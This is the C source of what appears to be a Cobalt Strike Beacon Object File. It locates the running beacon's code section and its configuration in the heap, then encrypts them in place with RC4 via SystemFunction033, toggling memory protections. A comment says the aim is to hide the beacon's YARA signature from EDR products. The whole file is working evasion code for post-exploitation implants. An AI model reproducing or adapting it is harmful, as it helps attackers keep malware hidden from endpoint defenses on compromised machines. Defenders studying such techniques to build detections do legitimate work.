/* ##################### Structs and Global Variables ##################### */

#include <ntstatus.h>
#include "beacon.h"

typedef struct _UNICODE_STRING
{
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef NTSTATUS(WINAPI *_SystemFunction033)(
    PUNICODE_STRING memoryRegion,
    PUNICODE_STRING keyPointer);

typedef struct _beacon_encrypt
{
    MEMORY_BASIC_INFORMATION mbi;
    HANDLE hCurrentProcess;
    HANDLE hProcessHeap;
    UNICODE_STRING beacon_text;
    UNICODE_STRING beacon_config;
    UNICODE_STRING encryption_key;
    _SystemFunction033 EncryptionFunction;
} beacon_encrypt;

#define RETURN_IF_FAILED(status) \
    if (status)                  \
    {                            \
        return FALSE;            \
    }

// Will only encrypt the known yara signature of the beacon and allow using of helper functions, doesn't work against every EDR though
// #define MINIMAL_ENCRYPT

// global variables
beacon_encrypt bencrypt = {0};
char key[] = "EncryptionKey";

/* ##################### Encryption and Decryption Routines ##################### */
#ifndef MINIMAL_ENCRYPT
BOOL beaconEncrypt()
{

    NTSTATUS status;
    DWORD old = 0;

    // encrypt .text
    if (!KERNEL32$VirtualProtectEx(bencrypt.hCurrentProcess, bencrypt.mbi.AllocationBase, bencrypt.mbi.RegionSize, PAGE_READWRITE, &old))
    {
        return FALSE;
    }

    // encrypt the .text
    status = bencrypt.EncryptionFunction(&bencrypt.beacon_text, &bencrypt.encryption_key); // encrypt
    RETURN_IF_FAILED(status);

    // encrypt the config in the heap
    bencrypt.EncryptionFunction(&bencrypt.beacon_config, &bencrypt.encryption_key);
    RETURN_IF_FAILED(status);

    return TRUE;
}

BOOL beaconDecrypt()
{
    NTSTATUS status = STATUS_SUCCESS;
    DWORD old = 0;

    KERNEL32$Sleep(5000);

    // decrypt the .text section
    bencrypt.EncryptionFunction(&bencrypt.beacon_text, &bencrypt.encryption_key); // encrypt
    RETURN_IF_FAILED(status)
    // restore protection to RX
    KERNEL32$VirtualProtectEx(bencrypt.hCurrentProcess, bencrypt.mbi.AllocationBase, bencrypt.mbi.RegionSize, PAGE_EXECUTE_READ, &old); // remove write

    // decrypt the config in the heap
    bencrypt.EncryptionFunction(&bencrypt.beacon_config, &bencrypt.encryption_key);
    RETURN_IF_FAILED(status)

    // we only allocated the encryption key, let's free it
    KERNEL32$HeapFree(bencrypt.hProcessHeap, 0, bencrypt.encryption_key.Buffer);

    // closing opened handles
    KERNEL32$CloseHandle(bencrypt.hCurrentProcess);
    return TRUE;
}

#else

BOOL beaconMinimalEncrypt()
{

    NTSTATUS status;
    DWORD old = 0;
    UNICODE_STRING bMinimal = {0};

    // encrypt .text
    // TODO: change this to readwrite only!
    if (!KERNEL32$VirtualProtectEx(bencrypt.hCurrentProcess, bencrypt.mbi.AllocationBase, bencrypt.mbi.RegionSize, PAGE_READWRITE, &old))
    {
        return FALSE;
    }

    bMinimal.Length = 48;
    bMinimal.Buffer = bencrypt.mbi.AllocationBase;
    status = bencrypt.EncryptionFunction(&bMinimal, &bencrypt.encryption_key); // encrypt
    RETURN_IF_FAILED(status);
    //  __debugbreak();
    // encrypt the config in the heap
    bencrypt.EncryptionFunction(&bencrypt.beacon_config, &bencrypt.encryption_key);
    RETURN_IF_FAILED(status);

    return TRUE;
}
BOOL beaconMinimalDecrypt()
{

    NTSTATUS status;
    DWORD old = 0;
    UNICODE_STRING bMinimal = {0};

    KERNEL32$Sleep(5000);

    bMinimal.Length = 48;
    bMinimal.Buffer = bencrypt.mbi.AllocationBase;
    status = bencrypt.EncryptionFunction(&bMinimal, &bencrypt.encryption_key); // encrypt
    RETURN_IF_FAILED(status);

    // revert protection
    KERNEL32$VirtualProtectEx(bencrypt.hCurrentProcess, bencrypt.mbi.AllocationBase, bencrypt.mbi.RegionSize, PAGE_EXECUTE_READ, &old); // remove write

    bencrypt.EncryptionFunction(&bencrypt.beacon_config, &bencrypt.encryption_key);
    RETURN_IF_FAILED(status);

    // we only allocated the encryption key, let's free it
    KERNEL32$HeapFree(bencrypt.hProcessHeap, 0, bencrypt.encryption_key.Buffer);
    // closing opened handles
    KERNEL32$CloseHandle(bencrypt.hCurrentProcess);

    return TRUE;
}
#endif

/* ######################## HEAP Searching Functions ######################## */

BOOL isCobaltStrikeValue(BYTE val)
{
    // because the value can be any of these 6 bytes
    BYTE sig[] = {0x00, 0x01, 0x02, 0x04, 0x08, 0x10};

    for (BYTE i = 0; i < sizeof(sig); i++)
    {
        if (val == sig[i])
            return TRUE;
    }

    return FALSE;
}

LPBYTE FindSignature(LPBYTE memoryAddress, SIZE_T size)
{
    char sig1[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    char sig2[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    char sig3[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    char sig4[] = {0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    char sig5[] = {0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    char sig6[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    //(00|01|02|04|08|10)
    LPBYTE orig = memoryAddress;
    //    BeaconPrintf(CALLBACK_OUTPUT, "Checking: %p", memoryAddress);
    for (size_t i = 0; i < size; i++)
    {
        if (!MSVCRT$memcmp(memoryAddress, sig1, sizeof(sig1)))
        {
            memoryAddress += sizeof(sig1);
            if (isCobaltStrikeValue(*(memoryAddress)))
            {
                memoryAddress += 1;
                if (!MSVCRT$memcmp(memoryAddress, sig2, sizeof(sig2)))
                {
                    memoryAddress += sizeof(sig2) + 2; // there are two random bytes
                    if (!MSVCRT$memcmp(memoryAddress, sig3, sizeof(sig3)))
                    {
                        memoryAddress += sizeof(sig3) + 4; // 4 random bytes
                        if (!MSVCRT$memcmp(memoryAddress, sig4, sizeof(sig4)))
                        {
                            memoryAddress += sizeof(sig4) + 4;
                            if (!MSVCRT$memcmp(memoryAddress, sig5, sizeof(sig5)))
                            {
                                memoryAddress += sizeof(sig5) + 2;
                                if (!MSVCRT$memcmp(memoryAddress, sig6, sizeof(sig6)))
                                {
                                    return orig;
                                }
                            }
                        }
                    }
                }
            }
        }
        memoryAddress += 1;
    }

    return NULL;
}

BOOL FindBeaconConfigInHeap()
{
    PROCESS_HEAP_ENTRY entry = {0};

    while (KERNEL32$HeapWalk(bencrypt.hProcessHeap, &entry))
    {
        if (entry.cbData == 2048)
        {
            if (FindSignature((LPBYTE)entry.lpData, entry.cbData))
            {
                bencrypt.beacon_config.Length = entry.cbData;
                bencrypt.beacon_config.Buffer = entry.lpData;
                return TRUE;
            }
        }
    }
    return FALSE;
}

/* ##################### Initialization ##################### */

BOOL init()
{
    LPVOID retAddr;

    retAddr = __builtin_return_address(1);
    BeaconPrintf(CALLBACK_OUTPUT, "retAddr: %p", retAddr);

    // we use these handles more than once, let's fetch them now
    bencrypt.hCurrentProcess = KERNEL32$GetCurrentProcess();
    bencrypt.hProcessHeap = KERNEL32$GetProcessHeap();

    // set the encryption key
    bencrypt.encryption_key.Length = sizeof key;
    bencrypt.encryption_key.Buffer = KERNEL32$HeapAlloc(bencrypt.hProcessHeap, 0, sizeof(key));
    if (!bencrypt.encryption_key.Buffer)
    {
        BeaconPrintf(CALLBACK_ERROR, "failed to allocate buf");
        return FALSE;
    }

    // Copy the key to encryption structure, this structure is passed as an argument to SystemFunction033 later
    MSVCRT$memcpy(bencrypt.encryption_key.Buffer, key, sizeof key);

    // resolve the encryption function
    bencrypt.EncryptionFunction = (_SystemFunction033)KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA("advapi32"), "SystemFunction033");
    if (!bencrypt.EncryptionFunction)
    {
        BeaconPrintf(CALLBACK_ERROR, "failed to get func");
        return FALSE;
    }

    if (!KERNEL32$VirtualQueryEx(bencrypt.hCurrentProcess, retAddr, &bencrypt.mbi, sizeof(bencrypt.mbi)))
    {
        BeaconPrintf(CALLBACK_ERROR, "VirtualQueryEx failed");
        return FALSE;
    }

    // fill the .text info for the encryption function
    bencrypt.beacon_text.Length = bencrypt.mbi.RegionSize;
    bencrypt.beacon_text.Buffer = bencrypt.mbi.AllocationBase;

    // this function will fill the config info for the encryption function
    if (!FindBeaconConfigInHeap())
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to find config");
        return FALSE;
    }

    return TRUE;
}

/* ##################### Helper Macros ##################### */

#define ENCRYPT_BEACON        \
    do                        \
    {                         \
        if (!beaconEncrypt()) \
        {                     \
            return;           \
        }                     \
    } while (0)

#define DECRYPT_BEACON        \
    do                        \
    {                         \
        if (!beaconDecrypt()) \
        {                     \
            return;           \
        }                     \
    } while (0)